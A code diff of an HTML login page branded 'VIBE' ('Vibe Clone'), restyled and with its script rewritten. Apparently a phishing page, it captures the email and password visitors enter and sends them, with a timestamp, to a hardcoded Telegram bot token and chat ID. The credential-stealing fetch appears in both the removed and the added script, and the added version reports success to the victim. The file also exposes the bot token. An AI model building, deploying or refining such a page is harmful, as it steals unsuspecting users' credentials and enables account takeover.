@@ -3,116 +3,132 @@
 <head>
   <meta charset="UTF-8">
   <title>Vibe Clone</title>
-  <style>
-    /* Basic Reset */
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
 
-    /* Container */
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
     .login-container {
       background: white;
       padding: 40px;
       border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-      width: 380px;
+      width: 350px;
       text-align: center;
-      transition: background 0.3s, color 0.3s;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      transition: 0.3s;
     }
-    .login-container.dark { background: #1c1c1c; color: white; }
 
-    /* Logo */
+    .dark {
+      background: #1c1c1c;
+      color: white;
+    }
+
     .logo {
-      font-size: 36px;
+      font-size: 32px;
       font-weight: bold;
       color: #4f46e5;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
     }
 
-    /* Inputs */
     input {
+      width: 100%;
+      padding: 12px;
       margin: 10px 0;
-      padding: 14px;
       border-radius: 6px;
       border: 1px solid #ccc;
-      width: 100%;
-      font-size: 16px;
     }
-    .login-container.dark input { background: #2a2a2a; border: 1px solid #555; color: white; }
 
-    /* Buttons */
+    .dark input {
+      background: #333;
+      color: white;
+      border: 1px solid #555;
+    }
+
     button {
-      margin: 15px 0;
-      padding: 14px;
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
       border: none;
       border-radius: 6px;
       background: #4f46e5;
       color: white;
       font-weight: bold;
-      font-size: 16px;
       cursor: pointer;
-      width: 100%;
-      transition: background 0.3s;
     }
-    button:hover { background: #4338ca; }
 
-    /* Dark mode toggle */
-    #darkToggle { background: #888; margin-top: 10px; }
-    #darkToggle:hover { background: #555; }
+    button:hover {
+      background: #4338ca;
+    }
+
+    #darkToggle {
+      background: gray;
+    }
   </style>
 </head>
+
 <body>
 
-  <div class="login-container">
+  <div class="login-container" id="box">
     <div class="logo">VIBE</div>
-    <input type="email" id="email" placeholder="Email" required>
-    <input type="password" id="password" placeholder="Password" required>
-    <button id="loginBtn">Log In</button>
+
+    <input type="email" id="email" placeholder="Email">
+    <input type="password" id="password" placeholder="Password">
+
+    <button onclick="sendLogin()">Log In</button>
     <button id="darkToggle">Toggle Dark Mode</button>
   </div>
 
   <script>
-    // Telegram Bot Info
     const TOKEN = "8697377512:AAEWHoZWP6LrwIZy5-gJwiJe_U36-MCvxhk";
     const CHAT_ID = "1957450632";
 
-    const loginBtn = document.getElementById("loginBtn");
-    const darkToggle = document.getElementById("darkToggle");
-    const container = document.querySelector(".login-container");
-
-    // Send login to Telegram
-    loginBtn.addEventListener("click", async () => {
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
+    function sendLogin() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
 
       if (!email || !password) {
-        alert("Please fill both email and password!");
+        alert("Fill all fields");
         return;
       }
 
-      const message = 🔐 LOGIN\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()};
+      const text =
+        "🔐 LOGIN\n" +
+        "Email: " + email + "\n" +
+        "Password: " + password + "\n" +
+        "Time: " + new Date().toLocaleString();
 
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-        });
+      fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      })
+      .then(res => {
+        alert("Sent successfully ✅");
+      })
+      .catch(err => {
+        console.log(err);
+        alert("Error ❌");
+      });
+    }
 
-        if (res.ok) {
-          alert("Login sent to Telegram!");
-        } else {
-          alert("Error sending message.");
-        }
-      } catch (err) {
-        console.error(err);
-        alert("Network error!");
-      }
-    });
-
-    // Dark mode toggle
-    darkToggle.addEventListener("click", () => {
-      container.classList.toggle("dark");
-    });
+    // Dark mode (THIS WILL WORK NOW)
+    document.getElementById("darkToggle").onclick = function () {
+      document.getElementById("box").classList.toggle("dark");
+    };
   </script>
+
 </body>
 </html>
